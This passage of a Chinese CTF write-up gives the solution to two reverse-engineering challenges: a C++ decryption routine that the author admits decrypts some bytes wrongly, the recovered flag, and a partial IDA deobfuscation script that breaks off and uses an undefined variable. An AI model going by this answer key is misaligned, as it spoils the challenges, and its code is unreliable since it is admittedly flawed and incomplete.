punctuation\">;</span></code></pre>\n\n<p>这也就是第一层加密的解密代码。</p>\n<p>第二层加密直接对着写即可，我写的有点问题（懒得改），其中几个字节解密不对，不过根据解密出的flag也能猜出是啥，替换完那几个字节就得到完整的flag。</p>\n<p>完整解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">decrypt_func</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> temp<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">int</span> base <span class=\"token operator\">=</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> block<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>base <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            block<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span>base <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x1F</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span>base <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            block<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span>base<span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span>base <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            block<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span>base<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span>base <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            block<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span>base <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span>base <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span> <span class=\"token operator\">&amp;&amp;</span> base <span class=\"token operator\">+</span> j <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                data<span class=\"token punctuation\">[</span>base <span class=\"token operator\">+</span> j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> block<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> Input<span class=\"token punctuation\">[</span><span class=\"token number\">48</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x4A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x9C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x51</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">decrypt_func</span><span class=\"token punctuation\">(</span>Input<span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">85</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">35</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">9</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">14</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">37</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">13</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">15</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">14</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">34</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">39</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">126</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">34</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">11</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">9</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">34</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> <span class=\"token number\">14</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">52</span><span class=\"token punctuation\">;</span>\n    Input<span class=\"token punctuation\">[</span><span class=\"token number\">38</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">119</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%.40s\\n\"</span><span class=\"token punctuation\">,</span> Input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// flag&#123;L3@rn-ng_1n_0ld_sch00b_@nd_g3x_j0y&#125; -> flag&#123;L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y&#125;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>flag{L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y}</p>\n<h3 id=\"EzObf\"><a href=\"#EzObf\" class=\"headerlink\" title=\"EzObf\"></a>EzObf</h3><p>main_0函数跟入发现有混淆，红框处为原真实汇编指令，其他都是混淆指令。</p>\n<p>混淆流程：</p>\n<ol>\n<li>执行真实指令</li>\n<li>call $+5执行pop rax，rax就是call时push到栈的返回地址，也就是pop rax指令的地址。</li>\n<li>给ebx赋值，进行rol计算，最后用rax加上或减去（共两种）rbx，得到跳转地址，进行jmp rax。</li>\n</ol>\n<p>之后每jmp过去一次，那边就都是一样的结构，popfq和pushfq之间就是真实汇编。</p>\n<p>deobf的思路即为nop那一堆pop和push，保留真实汇编指令，然后计算跳转地址，手动计算相对地址写jmp，保持代码执行流程。</p>\n<p><img src=\"/images/43-1744626745338-47.png\"></p>\n<p>deobf idc脚本：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">static</span> <span class=\"token function\">NopCode</span><span class=\"token punctuation\">(</span>Addr<span class=\"token punctuation\">,</span> Length<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">auto</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> Length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">PatchByte</span><span class=\"token punctuation\">(</span>Addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">static</span> <span class=\"token function\">rol</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">,</span> count<span class=\"token punctuation\">,</span> bits <span class=\"token operator\">=</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    count <span class=\"token operator\">=</span> count <span class=\"token operator\">%</span> bits<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token generic-function\"><span class=\"token function\">value</span> <span class=\"token generic class-name\"><span class=\"token operator\">&lt;&lt;</span> count<span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>value <span class=\"token operator\">>></span></span></span> <span class=\"token punctuation\">(</span>bits <span class=\"token operator\">-</span> count<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> bits<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 搜索真实汇编代码的下一个地址</span>\n<span class=\"token keyword\">static</span> <span class=\"token function\">FindEnd</span><span class=\"token punctuation\">(</span>Addr<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">auto</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> v <span class=\"token operator\">=</span> <span class=\"token function\">Dword</span><span class=\"token punctuation\">(</span>Addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>v <span class=\"token operator\">==</span> <span class=\"token number\">0x5153509C</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> Addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 搜索最后的jmp rax指令</span>\n<span class=\"token keyword\">static</span> <span class=\"token function\">FindJmpRax</span><span class=\"token punctuation\">(</span>Addr<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">auto</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> v <span class=\"token operator\">=</span> <span class=\"token function\">Word</span><span class=\"token punctuation\">(</span>Addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>v <span class=\"token operator\">==</span> <span class=\"token number\">0xE0FF</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> Addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 搜索call $+5</span>\n<span class=\"token keyword\">static</span> <span class=\"token function\">FindCall</span><span class=\"token punctuation\">(</span>Addr<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">auto</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">auto</span> v <span class=\"token operator\">=</span> <span class=\"token function\">Dword</span><span class=\"token punctuation\">(</span>Addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>v <span class=\"token operator\">==</span> <span class=\"token number\">0xE8</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> Addr <span class=\"token operator\">+</span> i<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">static</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">auto</span> StartAddr <span class=\"token operator\">=</span> <span class=\"token number\">0x1401F400D</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// 搜索真实汇编代码的下一个指令地址</span>\n        <span class=\"token keyword\">auto</span> EndAddr <span class=\"token operator\">=</span> <span class=\"token function\">FindEnd</span><span class=\"token punctuation\">(</span>StartAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>EndAddr <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token comment\">// 真实汇编代码的字节长度</span>\n        <span class=\"token keyword\">auto</span> CodeLength <span class=\"token operator\">=</span> EndAddr <span class=\"token operator\">-</span> addr <span class=\"token operator\">-</span> <span class=\"token number\">13</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 搜索Call $+5</span>\n        <span class=\"token keyword\">auto</span> CallAddr <span class=\"token operator\">=</span> <span class=\"token function\">FindCall</span><span class=\"token punctuation\">(</span>addr <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">+</span> CodeLength<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>CallAddr <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token comment\">// call $+5的下一条指令地址，即call时push到栈的返回地址</span>\n        <span class=\"token keyword\">auto</span> CalcAddr <span class=\"token operator\">=</span> CallAddr <span class=\"token operator\">+</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> ebx <span class=\"token operator\">=</span> <span class=\"token function\">Dword</span><span class=\"token punctuation\">(</span>CalcAddr <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> rol_Value <span class=\"token operator\">=</span> <span class=\"token function\">Byte</span><span class=\"token punctuation\">(</span>CalcAddr <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">auto</span> Mode <span class=\"token operator\">=</span> <span class=\"token function\">Dword</span><span class=\"token punctuation\">(</span>CalcAddr <span class=\"token operator\">+</span> <span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        ebx <span class=\"token operator\">=</span> <span class=\"token function\">rol</span><span class=\"token punctuation\">(</span>ebx<span class=\"token punctuation\">,</span> rol_Value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// 搜索最尾部的jmp rax指令地址</span>\n        <span class=\"token keyword\">auto</span> JmpRaxAddr <span class=\"token operator\">=</span> <span class=\"token function\">FindJmpRax</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token 